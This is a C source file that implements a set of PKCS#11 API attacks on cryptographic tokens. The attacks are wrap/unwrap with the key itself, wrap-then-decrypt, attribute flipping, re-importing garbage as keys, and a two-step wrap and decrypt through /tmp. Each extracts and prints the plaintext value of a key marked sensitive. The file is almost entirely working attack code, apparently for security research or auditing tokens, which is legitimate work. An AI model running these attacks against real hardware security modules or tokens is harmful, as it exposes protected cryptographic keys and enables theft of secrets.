#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "pkcs11_unix.h"
#include "attacks.h"
#include "utils.h"

CK_BBOOL yes = CK_TRUE;
CK_BBOOL no = CK_FALSE;
CK_OBJECT_CLASS secret_key_class = CKO_SECRET_KEY;
CK_KEY_TYPE key_type = CKK_DES;
CK_MECHANISM gen_mec = {CKM_DES_KEY_GEN, NULL_PTR, 0};
CK_MECHANISM enc_mec = {CKM_DES_ECB, NULL_PTR, 0};
CK_BYTE key_des_value[] = {0x99, 0x98, 0x97, 0x96, 0x95, 0x94, 0x93, 0x92};
CK_ATTRIBUTE template_wrap[] = {
	{CKA_CLASS,    &secret_key_class, sizeof(secret_key_class)},
	{CKA_KEY_TYPE, &key_type,         sizeof(key_type)},
	{CKA_WRAP,     &yes,              sizeof(CK_BBOOL)},
	{CKA_UNWRAP,   &no,               sizeof(CK_BBOOL)},
	{CKA_DECRYPT,  &no,               sizeof(CK_BBOOL)}
};
CK_ATTRIBUTE template_unwrap[] = {
	{CKA_CLASS,    &secret_key_class, sizeof(secret_key_class)},
	{CKA_KEY_TYPE, &key_type,         sizeof(key_type)},
	{CKA_WRAP,     &no,               sizeof(CK_BBOOL)},
	{CKA_UNWRAP,   &yes,              sizeof(CK_BBOOL)},
	{CKA_ENCRYPT,  &no,               sizeof(CK_BBOOL)},
	{CKA_DECRYPT,  &no,               sizeof(CK_BBOOL)}
};
CK_ATTRIBUTE template_decrypt[] = {
	{CKA_CLASS,    &secret_key_class, sizeof(secret_key_class)},
	{CKA_KEY_TYPE, &key_type,         sizeof(key_type)},
	{CKA_WRAP,     &no,               sizeof(CK_BBOOL)},
	{CKA_UNWRAP,   &no,               sizeof(CK_BBOOL)},
	{CKA_ENCRYPT,  &no,               sizeof(CK_BBOOL)},
	{CKA_DECRYPT,  &yes,              sizeof(CK_BBOOL)}
};
CK_ATTRIBUTE template_change_decrypt[] = {
	{CKA_WRAP,     &no,               sizeof(CK_BBOOL)},
	{CKA_DECRYPT,  &yes,              sizeof(CK_BBOOL)}
};
CK_ATTRIBUTE template_wrap_unwrap[] = {
	{CKA_CLASS,    &secret_key_class, sizeof(secret_key_class)},
	{CKA_KEY_TYPE, &key_type,         sizeof(key_type)},
	{CKA_WRAP,     &yes,              sizeof(CK_BBOOL)},
	{CKA_UNWRAP,   &yes,              sizeof(CK_BBOOL)},
	{CKA_ENCRYPT,  &no,               sizeof(CK_BBOOL)},
	{CKA_DECRYPT,  &no,               sizeof(CK_BBOOL)}

};
CK_ATTRIBUTE template_wrap_decrypt[] = {
	{CKA_CLASS,    &secret_key_class, sizeof(secret_key_class)},
	{CKA_KEY_TYPE, &key_type,         sizeof(key_type)},
	{CKA_WRAP,     &yes,              sizeof(CK_BBOOL)},
	{CKA_DECRYPT,  &yes,              sizeof(CK_BBOOL)},
	{CKA_ENCRYPT,  &no,               sizeof(CK_BBOOL)}
};
CK_ATTRIBUTE template_nonsensitive[] = {
	{CKA_CLASS,     &secret_key_class, sizeof(secret_key_class)},
	{CKA_KEY_TYPE,  &key_type,         sizeof(key_type)},
	{CKA_WRAP,      &no,               sizeof(CK_BBOOL)},
	{CKA_UNWRAP,    &no,               sizeof(CK_BBOOL)},
	{CKA_ENCRYPT,   &no,               sizeof(CK_BBOOL)},
	{CKA_DECRYPT,   &no,               sizeof(CK_BBOOL)}
};
CK_ATTRIBUTE template_sensitive_wrap[] = {
	{CKA_LABEL,     "SecureWrapping",  14},
	{CKA_CLASS,     &secret_key_class, sizeof(secret_key_class)},
	{CKA_KEY_TYPE,  &key_type,         sizeof(key_type)},
	{CKA_TOKEN,     &yes,              sizeof(CK_BBOOL)},
	// {CKA_EXTRACTABLE,&no,              sizeof(CK_BBOOL)},
	{CKA_SENSITIVE, &yes,              sizeof(CK_BBOOL)},
	{CKA_WRAP,      &yes,              sizeof(CK_BBOOL)},
	{CKA_UNWRAP,    &no,               sizeof(CK_BBOOL)},
	{CKA_ENCRYPT,   &no,               sizeof(CK_BBOOL)},
	{CKA_DECRYPT,   &no,               sizeof(CK_BBOOL)},
	{CKA_VALUE,     key_des_value,     sizeof(key_des_value)}
};
	// CK_ATTRIBUTE template_sensitive[] = {
	// 	{CKA_LABEL,     "MyPrecious",  10},
	// 	{CKA_CLASS,     &class_secret, sizeof(class_secret)},
	// 	{CKA_KEY_TYPE,  &type_des,     sizeof(type_des)},
	// 	{CKA_TOKEN,     &yes,          sizeof(CK_BBOOL)},
	// 	{CKA_SENSITIVE, &yes,          sizeof(CK_BBOOL)},
	// 	{CKA_ENCRYPT,   &no,          sizeof(CK_BBOOL)},
	// 	{CKA_DECRYPT,   &yes,          sizeof(CK_BBOOL)},
	// 	{CKA_VALUE,     key_value,     sizeof(key_value)}
	// };


CK_ATTRIBUTE template_sensitive_decrypt[] = {
	{CKA_LABEL,     "SecureDecrypting",  16},
	{CKA_CLASS,     &secret_key_class, sizeof(secret_key_class)},
	{CKA_KEY_TYPE,  &key_type,         sizeof(key_type)},
	{CKA_TOKEN,     &yes,              sizeof(CK_BBOOL)},
	// {CKA_EXTRACTABLE,&no,              sizeof(CK_BBOOL)},
	{CKA_SENSITIVE, &yes,              sizeof(CK_BBOOL)},
	{CKA_WRAP,      &no,              sizeof(CK_BBOOL)},
	{CKA_UNWRAP,    &no,               sizeof(CK_BBOOL)},
	{CKA_ENCRYPT,   &no,               sizeof(CK_BBOOL)},
	{CKA_DECRYPT,   &yes,              sizeof(CK_BBOOL)},
	{CKA_VALUE,     key_des_value,     sizeof(key_des_value)}
};
CK_ULONG template_wrap_len = 5;
CK_ULONG template_unwrap_len = 6;
CK_ULONG template_decrypt_len = 6;
CK_ULONG template_change_decrypt_len = 2;
CK_ULONG template_wrap_unwrap_len = 6;
CK_ULONG template_wrap_decrypt_len = 5;
CK_ULONG template_nonsensitive_len = 6;
CK_ULONG template_sensitive_wrap_len = 10;
CK_ULONG template_sensitive_decrypt_len = 10;

void
attack_wrap_unwrap_self(CK_SESSION_HANDLE session, CK_OBJECT_HANDLE key) {
	CK_OBJECT_HANDLE nonsensitive_key;
	CK_BYTE_PTR wrapped_key = NULL_PTR;
	CK_ULONG wrapped_key_len = 0;
	CK_ATTRIBUTE template_value[] = {
		{CKA_VALUE,     NULL_PTR, 0}
	};
	CK_ULONG template_value_len = 1;

	/* assume the sensitive key is a wrapping/unwrapping key */

	/* wrap the sensitive wrapping key with itself */
	printf(" *  Wrap k1 with k1\n");
	wrap_key(session, &enc_mec, key, key, &wrapped_key, &wrapped_key_len);

	/* re-import the key with itself */
	printf(" *  Re-import k1 as non-sensitive\n");
	unwrap_key(session, &enc_mec, key, wrapped_key,
		wrapped_key_len, template_nonsensitive,
		template_nonsensitive_len, &nonsensitive_key);

	/* get the key value */
	printf(" *  Recovering k1 value: ");
	p11d_get_attribute_value(session, nonsensitive_key,
		template_value, template_value_len);
	/* print the plain text of the key */
	show_hex(template_value[0].pValue,
		template_value[0].ulValueLen);
	/* clear the memory */
	free(wrapped_key);
	free(template_value[0].pValue);
}

void
attack_wrap_unwrap(CK_SESSION_HANDLE session, CK_OBJECT_HANDLE key) {
	CK_OBJECT_HANDLE wrapping_unwrapping_key, nonsensitive_key;
	CK_BYTE_PTR wrapped_key = NULL_PTR;
	CK_ULONG wrapped_key_len = 0;
	CK_ATTRIBUTE template_value[] = {
		{CKA_VALUE,     NULL_PTR, 0}
	};
	CK_ULONG template_value_len = 1;

	/* generate the wrapping/unwrapping key */
	printf(" *  Generate a key G for wrapping and unwrapping\n");
	generate_key(session, &gen_mec, template_wrap_unwrap,
		template_wrap_unwrap_len, &wrapping_unwrapping_key);

	/* wrap key with our new wrapping key and save the result in
	 * wrapped_key */
	printf(" *  Wrap the sensitive key R with the key G\n");
	wrap_key(session, &enc_mec, wrapping_unwrapping_key, key,
		&wrapped_key, &wrapped_key_len);

	/* finally unwrap */
	printf(" *  Unwrap the sensitive key R with the key G, disabling the CKA_SENSITIVE attribute\n");
	unwrap_key(session, &enc_mec, wrapping_unwrapping_key, wrapped_key,
		wrapped_key_len, template_nonsensitive,
		template_nonsensitive_len, &nonsensitive_key);

	/* get the key value */
	printf(" *  Recovering 'MyPrecious' value: ");
	p11d_get_attribute_value(session, nonsensitive_key,
		template_value, template_value_len);
	/* print the plain text of the key */
	show_hex(template_value[0].pValue,
		template_value[0].ulValueLen);
	/* clear the memory */
	free(wrapped_key);
	free(template_value[0].pValue);
}

void
attack_wrap_decrypt(CK_SESSION_HANDLE session, CK_OBJECT_HANDLE key) {
	CK_OBJECT_HANDLE wrapping_decrypting_key;
	CK_BYTE_PTR wrapped_key = NULL_PTR, key_plain = NULL_PTR;
	CK_ULONG wrapped_key_len = 0, key_plain_len = 0;

	/* generate the wrapping/decrypting key */
	printf(" *  Generate a key k2 for wrapping and decrypting\n");
	generate_key(session, &gen_mec, template_wrap_decrypt,
		template_wrap_decrypt_len, &wrapping_decrypting_key);

	/* wrap key with our new wrapping key and save the result in
	 * wrapped_key */
	printf(" *  Wrap the sensitive key k1 with the key k2\n");
	wrap_key(session, &enc_mec, wrapping_decrypting_key, key, &wrapped_key,
		&wrapped_key_len);

	/* finally decrypt */
	printf(" *  Decrypt the wrapped key k1 with the key k2\n");
	decrypt(session, &enc_mec, wrapping_decrypting_key, wrapped_key,
		wrapped_key_len, &key_plain, &key_plain_len);

	/* print the plain text of the key */
	printf(" *  Recovering k1 value: ");
	show_hex(key_plain, key_plain_len);
	/* clear the memory */
	free(wrapped_key);
	free(key_plain);
}

void
attack_wrap_decrypt_mutual(CK_SESSION_HANDLE session, CK_OBJECT_HANDLE key) {
	CK_OBJECT_HANDLE wrapping_decrypting_key;
	CK_BYTE_PTR wrapped_key = NULL_PTR, key_plain = NULL_PTR;
	CK_ULONG wrapped_key_len = 0, key_plain_len = 0;

	/* generate the wrapping key */
	printf(" *  Generate a key G for wrapping\n");
	generate_key(session, &gen_mec, template_wrap,
		template_wrap_len, &wrapping_decrypting_key);

	/* wrap key with our new wrapping key and save the result in
	 * wrapped_key */
	printf(" *  Wrap the sensitive key R with the key G\n");
	wrap_key(session, &enc_mec, wrapping_decrypting_key, key, &wrapped_key,
		&wrapped_key_len);

	/* enable the decrypt attribute of the wrapping_decrypting_key key */
	printf(" *  Flip WRAP and DECRYPT attributes on the key G\n");
	p11d_set_attribute_value(session, wrapping_decrypting_key,
		template_change_decrypt, template_change_decrypt_len);

	/* finally decrypt */
	printf(" *  Decrypt the wrapped key R with the key G\n");
	decrypt(session, &enc_mec, wrapping_decrypting_key, wrapped_key,
		wrapped_key_len, &key_plain, &key_plain_len);

	/* print the plain text of the key */
	printf(" *  Recovering 'MyPrecious' value: ");
	show_hex(key_plain, key_plain_len);
	/* clear the memory */
	free(wrapped_key);
	free(key_plain);
}

void
attack_re_import(CK_SESSION_HANDLE session, CK_OBJECT_HANDLE key) {
	CK_OBJECT_HANDLE unwrapping_key, wrapping_key, decrypting_key;
	CK_BYTE_PTR wrapped_key = NULL_PTR, key_plain = NULL_PTR;
	CK_ULONG wrapped_key_len = 0, key_plain_len = 0;
	CK_UTF8CHAR garbage[] = "eleeteel";
	CK_ULONG garbage_len = 8;

	/* generate the unwrapping key */
	printf(" *  Generate a key k2 for unwrapping\n");
	generate_key(session, &gen_mec, template_unwrap, template_unwrap_len,
		&unwrapping_key);

	/* unwrap some arbitrary data first with wrap support and then with
	 * decrypt support */
	printf(" *  Unwrap a random bytestream with k2 to import a new key k3 pointed by h3 that can wrap\n");
	unwrap_key(session, &enc_mec, unwrapping_key, (CK_BYTE_PTR) garbage,
		garbage_len, template_wrap, template_wrap_len, &wrapping_key);

	printf(" *  Unwrap a random bytestream with k2 to import a new key k3 pointed by h4 that can decrypt\n");
	unwrap_key(session, &enc_mec, unwrapping_key, garbage,
		garbage_len, template_decrypt, template_decrypt_len,
		&decrypting_key);

	/* wrap key with our new wrapping key and save the result in
	 * wrapped_key */
	printf(" *  Wrap the sensitive key k1 with h3\n");
	wrap_key(session, &enc_mec, wrapping_key, key, &wrapped_key,
		&wrapped_key_len);

	/* finally decrypt */
	printf(" *  Decrypt the wrapped key k1 with h4\n");
	decrypt(session, &enc_mec, decrypting_key, wrapped_key,
		wrapped_key_len, &key_plain, &key_plain_len);

	/* print the plain text of the key */
	printf(" *  Recovering k1 value: ");
	show_hex(key_plain, key_plain_len);

	/* clear the memory */
	free(wrapped_key);
	free(key_plain);
}

void
attack_distr_wrap(CK_SESSION_HANDLE session, CK_OBJECT_HANDLE key) {
	CK_OBJECT_HANDLE wrapping_key;
	CK_BYTE_PTR wrapped_key = NULL_PTR;
	CK_ULONG wrapped_key_len = 0;

	wrapping_key = create_sensitive_wrapping_key(session);
	printf("wrapping key created\n");
	create_sensitive_decrypt_key(session);
	printf("decrypt key created\n");

	/* wrap key with wrapping_key */
	printf(" *  Wrap the sensitive key k1 with the sensitive key k2\n");
	wrap_key(session, &enc_mec, wrapping_key, key, &wrapped_key, &wrapped_key_len);
	printf(" *  Wrapped data: ");
	show_hex(wrapped_key, wrapped_key_len);
	FILE *f = fopen("/tmp/wrapped_key", "w");
	fprintf(f, "%s", wrapped_key);
	fclose(f);
	printf(" *  Destroying the sensitive key k1\n");
	// C_DestroyObject(session, key);
}

void
attack_distr_decrypt(CK_SESSION_HANDLE session) {
	CK_OBJECT_HANDLE decrypt_key;
	CK_BYTE_PTR wrapped_key = malloc(8 * sizeof(CK_BYTE));
	CK_BYTE_PTR decrypted_key = NULL_PTR;
	CK_ULONG wrapped_key_len = 8;
	CK_ULONG decrypted_key_len = 0;

	FILE *f = fopen("/tmp/wrapped_key", "rb");
	fread(wrapped_key, wrapped_key_len, 1, f);
	decrypt_key = get_key(session, template_sensitive_decrypt, 1);
	printf(" *  Decrypt wrapped data ");
	show_hex(wrapped_key, wrapped_key_len);
	printf("with the key k2\n");
	decrypt(session, &enc_mec, decrypt_key, wrapped_key,
	wrapped_key_len, &decrypted_key, &decrypted_key_len);
	printf(" *  Recovering k1 value: ");
	show_hex(decrypted_key, decrypted_key_len);
	free(wrapped_key);
}

CK_OBJECT_HANDLE
create_sensitive_wrapping_key(CK_SESSION_HANDLE session) {
	CK_OBJECT_HANDLE key;

	/* generate and store in the token the sensitive key for wrapping/decrypting */
	// generate_key(session, &gen_mec, template_sensitive_wrap_decrypt,
	// 	template_sensitive_wrap_decrypt_len, &sensitive_wrapping_decrypting_key);
	create_object(session, template_sensitive_wrap, template_sensitive_wrap_len, &key);
	return key;
}

CK_OBJECT_HANDLE
create_sensitive_decrypt_key(CK_SESSION_HANDLE session) {
	CK_OBJECT_HANDLE key;

	/* generate and store in the token the sensitive key for wrapping/decrypting */
	// generate_key(session, &gen_mec, template_sensitive_wrap_decrypt,
	// 	template_sensitive_wrap_decrypt_len, &sensitive_wrapping_decrypting_key);
	create_object(session, template_sensitive_decrypt, template_sensitive_decrypt_len, &key);
	return key;
}
